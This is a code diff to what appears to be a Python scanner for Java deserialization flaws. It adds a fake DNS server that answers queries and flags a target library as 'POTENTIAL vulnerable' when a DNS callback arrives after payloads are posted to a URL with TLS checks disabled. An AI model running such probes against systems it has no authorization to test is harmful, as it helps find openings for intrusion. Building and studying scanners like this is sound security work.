@@ -7,6 +7,7 @@ import urllib3
 import logging
 from tabulate import tabulate
 from bs4 import BeautifulSoup as Soup
+from dnslib import DNSRecord
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 session = requests.Session()
@@ -14,23 +15,28 @@ session.headers.update({
     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.99"})
 
 
-# Catch DNS query while sending DNS java deserialization payloads
+# Fake DNS server to catch query while sending DNS java deserialization payloads
 def catch_dns_query():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     port = 53
     hostname = socket.gethostname()
     my_ip = socket.gethostbyname(hostname)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((my_ip, port))
-    sock.settimeout(2)
-    try:
-        while True:
-            data = sock.recvfrom(512)
-            if "google" in str(data):
-                return True
-            else:
+    while True:
+        data, add = sock.recvfrom(1024)
+        dns = DNSRecord.parse(data)
+        for ques in dns.questions:
+            name = ques.get_qname()
+            r = dns.reply()
+            try:
+                sock.sendto(r.pack(), add)
+                if "google" in str(name):
+                    return True
+                else:
+                    return False
+            except Exception as ex:
+                print(ex)
                 return False
-    except socket.timeout:
-        return False
 
 
 # Java Deserialization Ping Scan
@@ -51,6 +57,7 @@ def ping_deserialization(url):
         rq = session.post(url, data=payload, verify=False)
         if catch_dns_query():
             print('\033[91m' + '    [+] {} lib can be POTENTIAL vulnerable'.format(name.strip()))
+        time.sleep(2)
 
 
 # Java Deserialization Sleep Scan
